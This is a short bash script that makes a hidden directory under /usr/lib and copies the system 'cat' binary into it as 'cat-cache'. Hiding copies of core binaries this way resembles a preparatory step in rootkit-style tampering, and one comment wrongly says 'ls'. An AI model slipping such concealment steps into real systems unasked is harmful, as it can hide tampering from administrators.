#!/bin/bash

# Create hidden backup directory if it doesn't exist
mkdir -p /usr/lib/.backup_bins/

# Locate binaries
cat_path="$(which cat 2>/dev/null)"

# Backup ls only if not already copied

if [ ! -f "/usr/lib/.backup_bins/cat-cache" ]; then
    cp "$cat_path" "/usr/lib/.backup_bins/cat-cache"
fi
